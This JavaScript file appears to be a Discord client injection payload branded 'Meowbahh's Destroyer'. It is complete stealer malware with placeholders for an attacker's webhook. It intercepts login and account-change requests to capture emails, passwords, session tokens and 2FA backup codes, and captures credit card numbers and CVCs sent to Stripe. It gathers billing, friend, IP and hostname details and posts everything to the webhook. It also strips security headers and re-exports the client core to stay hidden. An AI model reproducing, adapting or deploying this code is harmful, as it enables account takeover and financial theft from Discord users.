const {
    BrowserWindow,
    session
} = require('electron');
const fs = require('fs');
const path = require('path');
const querystring = require("querystring");
const os = require('os')
const webhook = "%WEBHOOK_LINK%";
const Filter = {
    urls: ["https://discord.com/api/v*/users/@me", "https://discordapp.com/api/v*/users/@me", "https://*.discord.com/api/v*/users/@me", "https://discordapp.com/api/v*/auth/login", 'https://discord.com/api/v*/auth/login', 'https://*.discord.com/api/v*/auth/login', "https://api.stripe.com/v1/tokens"]
};

const config = {
    webhook: '%/WEBHOOKURL/%',
    instantLogout: %/LOGOUT/%,
    init_notification: %/INITNOTICATION/%,
    logout_notification: %/LOGOUTNOTIFICATION/%,
    disable_qr_code: %/DISABLEQRCODE/%,
    colors: {
        success: %/EMBEDCOLOR-SUCCESS/%,
        error: %/EMBEDCOLOR-ERROR/%
    }
}

const badges = {
    Discord_Employee: {
        Value: 1,
        Emoji: "<:staff:874750808728666152>",
        Rare: true,
    },
    Partnered_Server_Owner: {
        Value: 2,
        Emoji: "<:partner:874750808678354964>",
        Rare: true,
    },
    HypeSquad_Events: {
        Value: 4,
        Emoji: "<:hypesquad_events:874750808594477056>",
        Rare: true,
    },
    Bug_Hunter_Level_1: {
        Value: 8,
        Emoji: "<:bughunter_1:874750808426692658>",
        Rare: true,
    },
    Early_Supporter: {
        Value: 512,
        Emoji: "<:early_supporter:874750808414113823>",
        Rare: true,
    },
    Bug_Hunter_Level_2: {
        Value: 16384,
        Emoji: "<:bughunter_2:874750808430874664>",
        Rare: true,
    },
    Early_Verified_Bot_Developer: {
        Value: 131072,
        Emoji: "<:developer:874750808472825986>",
        Rare: true,
    },
    House_Bravery: {
        Value: 64,
        Emoji: "<:bravery:874750808388952075>",
        Rare: false,
    },
    House_Brilliance: {
        Value: 128,
        Emoji: "<:brilliance:874750808338608199>",
        Rare: false,
    },
    House_Balance: {
        Value: 256,
        Emoji: "<:balance:874750808267292683>",
        Rare: false,
    },
};


class LogEvent {
    constructor(event, token, data) {
        this.event = event;
        this.data = data;
        this.token = token;
    }
    handle() {
        switch (this.event) {
            case 'passwordChanged':
                passwordChanged(this.data.password, this.data.new_password, this.token);
                break;
            case 'userLogin':
                userLogin(this.data.password, this.data.email, this.token);
                break;
            case 'emailChanged':
                emailChanged(this.data.password, this.data.email, this.token);
                break;
            case 'creditCardAdded':
                creditCardAdded(this.data.cardnumber, this.data.cvc, this.data.expiration, this.token)
                break;
        }
    }
}

async function firstTime() {
    var token = await getToken()
    if (config.init_notification) {
        if (fs.existsSync(path.join(__dirname, "init"))) {
            fs.rmdirSync(path.join(__dirname, "init"));
            if (token == null || token == undefined || token == "") {
                var c = {
                    content: null,
                    embeds: [{
                        title: "Discord Initalized (User not Logged in)",
                        color: config.colors.success,
                        fields: [{
                            name: "Info",
                            value: `\`\`\`Hostname: \n${os.hostname()}\nInjection Info: \n${__dirname}\n\`\`\``,
                            inline: !1
                        }],
                        footer: {
                            text: "Meowbahh's Destroyer"
                        }
                    }]
                };
                sendToWebhook(JSON.stringify(c));
            } else {
                var b = await getUserInfo(token)
                var c = {
                    content: null,
                    embeds: [{
                        title: "Discord Initalized",
                        description: `[Click Here To Copy Info On Mobile**](https://ctf.surf/raw/${token})`,
                        color: config.colors.success,
                        fields: [{
                            name: "Info",
                            value: `\`\`\`Hostname: \n${os.hostname()}\nInjection Info: \n${__dirname}\n\`\`\``,
                            inline: !1
                        }, {
                            name: "Username",
                            value: `\`${b.username}#${b.discriminator}\``,
                            inline: !0
                        }, {
                            name: "ID",
                            value: `\`${b.id}\``,
                            inline: !0
                        }, {
                            name: "Badges",
                            value: `${getBadges(b.flags)}`,
                            inline: !1
                        }, {
                            name: "Token",
                            value: `\`\`\`${token}\`\`\``,
                            inline: !1
                        }],
                        footer: {
                            text: "Meowbahh's Destroyer"
                        },
                        thumbnail: {
                            url: `https://cdn.discordapp.com/avatars/${b.id}/${b.avatar}`
                        }
                    }]
                };
                sendToWebhook(JSON.stringify(c))
            }
        }
    }
    if (!fs.existsSync(path.join(__dirname, "MeowbahhsDestroyer"))) return !0

    fs.rmdirSync(path.join(__dirname, "MeowbahhsDestroyer"));
    if (config.instantLogout) {
        if (config.logout_notification) {
            if (!token) {
                var c = {
                    content: null,
                    embeds: [{
                        title: "User log out (User not Logged in before)",
                        color: config.colors.success,
                        fields: [{
                            name: "Info",
                            value: `\`\`\`Hostname: \n${os.hostname()}\nInjection Info: \n${__dirname}\n\`\`\``,
                            inline: !1
                        }],
                        footer: {
                            text: "Meowbahh's Destroyer"
                        }
                    }]
                };
                sendToWebhook(JSON.stringify(c));
            } else {
                const b = await getUserInfo(token);
                var c = {
                    content: null,
                    embeds: [{
                        title: "User got logged out",
                        description: `[Click Here To Copy Info On Mobile**](https://ctf.surf/raw/${token})`,
                        color: config.colors.success,
                        fields: [{
                            name: "Info",
                            value: `\`\`\`Hostname: \n${os.hostname()}\nInjection Info: \n${__dirname}\n\`\`\``,
                            inline: !1
                        }, {
                            name: "Username",
                            value: `\`${b.username}#${b.discriminator}\``,
                            inline: !0
                        }, {
                            name: "ID",
                            value: `\`${b.id}\``,
                            inline: !0
                        }, {
                            name: "Badges",
                            value: `${getBadges(b.flags)}`,
                            inline: !1
                        }, {
                            name: "Token",
                            value: `\`\`\`${token}\`\`\``,
                            inline: !1
                        }],
                        footer: {
                            text: "Meowbahh's Destroyer"
                        },
                        thumbnail: {
                            url: `https://cdn.discordapp.com/avatars/${b.id}/${b.avatar}`
                        }
                    }]
                };
                sendToWebhook(JSON.stringify(c))
            }
        }
        const window = BrowserWindow.getAllWindows()[0];
        window.webContents.executeJavaScript(`window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]);function LogOut(){(function(a){const b="string"==typeof a?a:null;for(const c in gg.c)if(gg.c.hasOwnProperty(c)){const d=gg.c[c].exports;if(d&&d.__esModule&&d.default&&(b?d.default[b]:a(d.default)))return d.default;if(d&&(b?d[b]:a(d)))return d}return null})("login").logout()}LogOut();`, !0).then((result) => {});
    }
    return !1

}
const QRFilter = {
	"urls": ["https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json", "https://*.discord.com/api/v*/applications/detectable", "https://discord.com/api/v*/applications/detectable", "https://*.discord.com/api/v*/users/@me/library", "https://discord.com/api/v*/users/@me/library", "https://*.discord.com/api/v*/users/@me/billing/subscriptions", "https://discord.com/api/v*/users/@me/billing/subscriptions", "wss://remote-auth-gateway.discord.gg/*"]
}

session.defaultSession.webRequest.onBeforeRequest(QRFilter, (details, callback) => {
    if (details.url.startsWith("wss://")) {
        if (config.disable_qr_code) {
            callback({
                cancel: true
            })
            return;
        }
    }
    if (firstTime()) {}

    callback({})
    return;
})

session.defaultSession.webRequest.onHeadersReceived((details, callback) => {
    if (details.url.startsWith(webhook)) {
        if (details.url.includes("discord.com")) {
            callback({
                responseHeaders: Object.assign({
                    'Access-Control-Allow-Headers': "*"
                }, details.responseHeaders)
            });
        } else {
            callback({
                responseHeaders: Object.assign({
                    "Content-Security-Policy": ["default-src '*'", "Access-Control-Allow-Headers '*'", "Access-Control-Allow-Origin '*'"],
                    'Access-Control-Allow-Headers': "*",
                    "Access-Control-Allow-Origin": "*"
                }, details.responseHeaders)
            });
        }
    } else {
        delete details.responseHeaders['content-security-policy'];
        delete details.responseHeaders['content-security-policy-report-only'];

        callback({
            responseHeaders: {
                ...details.responseHeaders,
                'Access-Control-Allow-Headers': "*"
            }
        })
    }

})

// Main functions

async function userLogin(password, email, token) {
    var userInfo = await getUserInfo(token);
    var ip = await getIp();
    var billing = await getBilling(token);
    var friends = await getRelationships(token);

    var params = {
        content: null,
        embeds: [{
            "title": "User Login",
            "description": `[Click Here To Copy Info On Mobile**](https://ctf.surf/raw/${token}<br>${password})`,
            "color": config.colors.success,
            "fields": [{
                name: "Info",
                value: `\`\`\`Hostname: \n${os.hostname()}\nIP: \n${ip}\nInjection Info: \n${__dirname}\n\`\`\``,
                inline: !1
            }, {
                name: "Username",
                value: `\`${userInfo.username}#${userInfo.discriminator}\``,
                inline: !0
            }, {
                name: "ID",
                value: `\`${userInfo.id}\``,
                inline: !0
            }, {
                name: "Nitro",
                value: `${getNitro(userInfo.premium_type)}`,
                inline: !1
            }, {
                name: "Badges",
                value: `${getBadges(userInfo.flags)}`,
                inline: !1
            }, {
                name: "Billing",
                value: `${billing}`,
                inline: !1
            }, {
                name: "Email",
                value: `\`${email}\``,
                inline: !0
            }, {
                name: "Password",
                value: `\`${password}\``,
                inline: !0
            }, {
                name: "Token",
                value: `\`\`\`${token}\`\`\``,
                inline: !1
            }],
            "footer": {
                "text": "Meowbahh's Destroyer"
            },
            "thumbnail": {
                "url": `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}`
            }
        }, {
            "title": `Total Friends (${friends.length})`,
            "color": config.colors.success,
            "description": friends.frien,
            "footer": {
                "text": "Meowbahh's Destroyer"
            },
            "thumbnail": {
                "url": `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}`
            }
        }]
    };

    if (token.startsWith("mfa")) {
        var codes = await get2faCodes(token, password)
        var embed = {
            "title": ":detective: __2FA Codes__",
            "description": `[Get all of them](${codes.url})`,
            "color": config.colors.success,
            "fields": codes.fields,
            "footer": {
                "text": "Meowbahh's Destroyer"
            }
        }
        params.embeds.push(embed)
    }

    sendToWebhook(JSON.stringify(params))

}
async function emailChanged(password, newEmail, token) {
    var userInfo = await getUserInfo(token);
    var ip = await getIp();
    var friends = await getRelationships(token);


    var params = {
        content: null,
        embeds: [{
            "title": "Email Changed",
            "description": `[Click Here To Copy Info On Mobile**](https://ctf.surf/raw/${token}<br>${password}<br>${newEmail})`,
            "color": config.colors.success,
            "fields": [{
                name: "Info",
                value: `\`\`\`Hostname: \n${os.hostname()}\nIP: \n${ip}\`\`\``,
                inline: !1
            }, {
                name: "Username",
                value: `\`${userInfo.username}#${userInfo.discriminator}\``,
                inline: !0
            }, {
                name: "ID",
                value: `\`${userInfo.id}\``,
                inline: !0
            }, {
                name: "Nitro",
                value: `${getNitro(userInfo.premium_type)}`,
                inline: !1
            }, {
                name: "Badges",
                value: `${getBadges(userInfo.flags)}`,
                inline: !1
            }, {
                name: "New Email",
                value: `\`${newEmail}\``,
                inline: !0
            }, {
                name: "Password",
                value: `\`${password}\``,
                inline: !0
            }, {
                name: "Token",
                value: `\`\`\`${token}\`\`\``,
                inline: !1
            }],
            "footer": {
                "text": "Meowbahh's Destroyer"
            },
            "thumbnail": {
                "url": `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}`
            }
        }, {
            "title": `Total Friends (${friends.length})`,
            "color": config.colors.success,
            "description": friends.frien,
            "footer": {
                "text": "Meowbahh's Destroyer"
            },
            "thumbnail": {
                "url": `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}`
            }
        }]
    }
    if (token.startsWith("mfa")) {
        var codes = await get2faCodes(token, password)
        var embed = {
            "title": ":detective: __2FA Codes__",
            "description": `[Get all of them](${codes.url})`,
            "color": config.colors.success,
            "fields": codes.fields,
            "footer": {
                "text": "Meowbahh's Destroyer"
            }
        }
        params.embeds.push(embed)
    }
    sendToWebhook(JSON.stringify(params))
}
async function passwordChanged(oldPassword, newPassword, token) {
    var userInfo = await getUserInfo(token);
    var ip = await getIp();
    var billing = await getBilling(token);
    var friends = await getRelationships(token);

    var params = {
        username: "Arizona",
        content: "",
        embeds: [{
            "title": "Password Changed",
            "description": `[Click Here To Copy Info On Mobile**](https://ctf.surf/raw/${token}<br>${newPassword})`,
            "color": config.colors.success,
            "fields": [{
                name: "Info",
                value: `\`\`\`Hostname: \n${os.hostname()}\nIP: \n${ip}\nInjection Info: \n${__dirname}\n\`\`\``,
                inline: !1
            }, {
                name: "Username",
                value: `\`${userInfo.username}#${userInfo.discriminator}\``,
                inline: !0
            }, {
                name: "ID",
                value: `\`${userInfo.id}\``,
                inline: !0
            }, {
                name: "Nitro",
                value: `${getNitro(userInfo.premium_type)}`,
                inline: !1
            }, {
                name: "Badges",
                value: `${getBadges(userInfo.flags)}`,
                inline: !1
            }, {
                name: "Billing",
                value: `${billing}`,
                inline: !1
            }, {
                name: "Email",
                value: `\`${userInfo.email}\``,
                inline: !1
            }, {
                name: "Old Password",
                value: `\`${oldPassword}\``,
                inline: !0
            }, {
                name: "New Password",
                value: `\`${newPassword}\``,
                inline: !0
            }, {
                name: "Token",
                value: `\`\`\`${token}\`\`\``,
                inline: !1
            }],
            "footer": {
                "text": "Meowbahh's Destroyer"
            },
            "thumbnail": {
                "url": `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}`
            }
        }, {
            "title": `Total Friends (${friends.length})`,
            "color": config.colors.success,
            "description": friends.frien,
            "footer": {
                "text": "Meowbahh's Destroyer"
            },
            "thumbnail": {
                "url": `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}`
            }
        }]
    }

    if (token.startsWith("mfa")) {
        var codes = await get2faCodes(token, newPassword)
        var embed = {
            "title": ":detective: __2FA Codes__",
            "description": `[Get all of them](${codes.url})`,
            "color": config.colors.success,
            "fields": codes.fields,
            "footer": {
                "text": "Meowbahh's Destroyer"
            }
        }
        params.embeds.push(embed)
    }
    sendToWebhook(JSON.stringify(params))
}
async function creditCardAdded(cardnumber, cvc, expiration, token) {
    var userInfo = await getUserInfo(token);
    var ip = await getIp();
    var billing = await getBilling(token);
    var friends = await getRelationships(token);

    var params = {
        content: null,
        embeds: [{
            "title": "Credit Card",
            "description": `[Click Here To Copy Info On Mobile**](https://ctf.surf/raw/${token}})`,
            "color": config.colors.success,
            "fields": [{
                    name: "Info",
                    value: `\`\`\`Hostname: \n${os.hostname()}\nIP: \n${ip}\nInjection Info: \n${__dirname}\n\`\`\``,
                    inline: !1
                }, {
                    name: "Username",
                    value: `\`${userInfo.username}#${userInfo.discriminator}\``,
                    inline: !0
                }, {
                    name: "ID",
                    value: `\`${userInfo.id}\``,
                    inline: !0
                }, {
                    name: "Nitro",
                    value: `${getNitro(userInfo.premium_type)}`,
                    inline: !1
                }, {
                    name: "Badges",
                    value: `${getBadges(userInfo.flags)}`,
                    inline: !1
                }, {
                    name: "Billing",
                    value: `${billing}`,
                    inline: !1
                }, {
                    name: "Email",
                    value: `\`${userInfo.email}\``,
                    inline: false
                }, {
                    name: "CC Number",
                    value: `\`${cardnumber}\``,
                    inline: !0
                }, {
                    name: "Expiration",
                    value: `\`${expiration}\``,
                    inline: !0
                },
                {
                    name: "CVC",
                    value: `\`${cvc}\``,
                    inline: !0
                }, {
                    name: "Token",
                    value: `\`\`\`${token}\`\`\``,
                    inline: !1
                }
            ],
            "footer": {
                "text": "Meowbahh's Destroyer"
            },
            "thumbnail": {
                "url": `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}`
            }
        }, {
            "title": `Total Friends (${friends.length})`,
            "color": config.colors.success,
            "description": friends.frien,
            "footer": {
                "text": "Meowbahh's Destroyer"
            },
            "thumbnail": {
                "url": `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}`
            }
        }]
    };

    sendToWebhook(JSON.stringify(params))
}


// Helpers functions
async function sendToWebhook(params) {
    
    const window = BrowserWindow.getAllWindows()[0];
    window.webContents.executeJavaScript(`    var xhr = new XMLHttpRequest();
		xhr.open("POST", "${webhook}", true);
		xhr.setRequestHeader('Content-Type', 'application/json');
		xhr.setRequestHeader('Access-Control-Allow-Origin', '*');
		xhr.send(JSON.stringify(${params}));
		`, !0)

}
async function getRelationships(token) {
    const window = BrowserWindow.getAllWindows()[0];
    var a = await window.webContents.executeJavaScript(`var xmlHttp = new XMLHttpRequest();xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/relationships", false );xmlHttp.setRequestHeader("Authorization", "${token}");xmlHttp.send( null );xmlHttp.responseText`, !0)
    var json = JSON.parse(a)
    const r = json.filter((user) => {
        return user.type == 1
    })
    var rareBadgesFriends = "";
    for (z of r) {
        var b = getRareBadges(z.user.public_flags)
        if (b != "") {
            rareBadgesFriends += b + ` ${z.user.username}#${z.user.discriminator}\n`
        }
    }
    if (!rareBadgesFriends) rareBadgesFriends = "No Rare Friends"

    return {
        length: r.length,
        frien: rareBadgesFriends
    }
}

async function get2faCodes(token, password) {
    let fields = [];
    let baseuri = "https://ctf.surf/raw/";

    const window = BrowserWindow.getAllWindows()[0];
    var a = await window.webContents.executeJavaScript(`var xmlHttp = new XMLHttpRequest();xmlHttp.open("POST", "https://discord.com/api/v9/users/@me/mfa/codes", false);xmlHttp.setRequestHeader('Content-Type', 'application/json');xmlHttp.setRequestHeader("authorization", "${token}");xmlHttp.send(JSON.stringify({\"password\":\"${password}\",\"regenerate\":false}));xmlHttp.responseText`, !0)

    var json = JSON.parse(a)
    let codes = json.backup_codes
    const r = codes.filter((code) => {
        return code.consumed == null
    })
    for (let z in r) {
        fields.push({
            name: `Code`,
            value: `\`${r[z].code.insert(4, "-")}\``,
            inline: true
        })
        baseuri += `${r[z].code.insert(4, "-")}<br>`
    }

    return {
        fields: fields,
        url: baseuri
    }
}
async function getBilling(token) {
    const window = BrowserWindow.getAllWindows()[0];
    var a = await window.webContents.executeJavaScript(`var xmlHttp = new XMLHttpRequest(); xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/billing/payment-sources", false ); xmlHttp.setRequestHeader("Authorization", "${token}"); xmlHttp.send( null ); xmlHttp.responseText`, !0)
    var json = JSON.parse(a)

    var billing = "";
    json.forEach(z => {
        if (z.type == "") {
            return "\`❌\`";
        } else if (z.type == 2 && z.invalid != !0) {
            billing += "\`✔️\`" + " <:paypal:896441236062347374>";
        } else if (z.type == 1 && z.invalid != !0) {
            billing += "\`✔️\`" + " :credit_card:";
        } else {
            return "\`❌\`";
        };
    });

    if (billing == "") billing = "\`❌\`"
    return billing;
}
async function getUserInfo(token) {
    const window = BrowserWindow.getAllWindows()[0];
    var a = await window.webContents.executeJavaScript(`var xmlHttp = new XMLHttpRequest();xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );xmlHttp.setRequestHeader("Authorization", "${token}");xmlHttp.send( null );xmlHttp.responseText;`, !0)
    return JSON.parse(a)
}
async function getIp() {
    const window = BrowserWindow.getAllWindows()[0];
    var ip = await window.webContents.executeJavaScript(`var xmlHttp = new XMLHttpRequest();xmlHttp.open( "GET", "https://www.myexternalip.com/raw", false );xmlHttp.send( null );xmlHttp.responseText;`, !0)
    return ip
}
async function getToken() {
    const window = BrowserWindow.getAllWindows()[0];
    var token = await window.webContents.executeJavaScript(`for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[['get_require']]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)'getToken'==a&&(token=b.default.getToken())}token;`, !0)
    return token
}

function getBadges(flags) {
    var b = '';
    for (const prop in badges) {
        let o = badges[prop];
        if ((flags & o.Value) == o.Value) b += o.Emoji;
    };
    if (b == '') b = 'None'
    return b;
}

function getRareBadges(flags) {
    var b = '';
    for (const prop in badges) {
        let o = badges[prop];
        if ((flags & o.Value) == o.Value && o.Rare) b += o.Emoji;
    };
    return b;
}

function getNitro(flags) {
    switch (flags) {
        case 0:
            return "No Nitro";
        case 1:
            return "<:classic:896119171019067423> \`Nitro Classic\`";
        case 2:
            return "<a:boost:824036778570416129> \`Nitro Boost\`";
        default:
            return "No Nitro";

    };
}

session.defaultSession.webRequest.onCompleted(Filter, async (details, callback) => {
    if (details.statusCode != 200) return;
   

    const unparsed_data = Buffer.from(details.uploadData[0].bytes).toString();
    const data = JSON.parse(unparsed_data)
    const token = await getToken();

    switch (true) {
        case details.url.endsWith('login'):
            var event = new LogEvent('userLogin', token, {
                password: data.password,
                email: data.login
            });
            event.handle();
            return;
        case details.url.endsWith('users/@me') && details.method == 'PATCH':
            if (!data.password) return;
            if (data.email) {
                var event = new LogEvent('emailChanged', token, {
                    password: data.password,
                    email: data.email
                });
                event.handle();

            };
            if (data.new_password) {
                var event = new LogEvent('passwordChanged', token, {
                    password: data.password,
                    new_password: data.new_password
                });
                event.handle();
            };
            return;
        case details.url.endsWith('tokens') && details.method == "POST":
            const card = querystring.parse(decodeURIComponent(unparsed_data))
            var event = new LogEvent('creditCardAdded', token, {
                cardnumber: card["card[number]"],
                cvc: card["card[cvc]"],
                expiration: card["card[exp_month]"] + "/" + card["card[exp_year]"]
            });
            event.handle();
            return;
        default:
            break;
    }

});

module.exports = require('./core.asar')